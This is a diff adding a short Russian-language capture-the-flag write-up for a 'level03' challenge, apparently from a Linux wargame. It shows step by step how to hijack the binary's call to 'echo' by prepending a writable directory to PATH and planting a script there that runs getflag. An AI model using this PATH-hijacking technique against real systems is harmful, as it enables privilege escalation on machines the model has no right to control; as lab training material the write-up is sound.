@@ -1,0 +1,29 @@
+мы видим исполняймый файл level03
+через команду 
+```
+>strings level03
+```
+ мы увидим что он запускает echo
+```
+/usr/bin/env echo Exploit me
+```
+в переменном окружение мы можем заменить путь к echo и подменить bash скриптом с запуском getflag
+замена пути к поиску бинарников
+```
+export PATH=/tmp/level03:$PATH
+```
+скрипт для запуска getflag
+```
+>echo '
+	#!/bin/sh
+	getflag
+' > /tmp/level03/echo 
+```
+и права для запуска скрипта
+```
+>chmod +x /tmp/level03/echo
+```
+после запуска получаем flag
+```
+./level03
+```
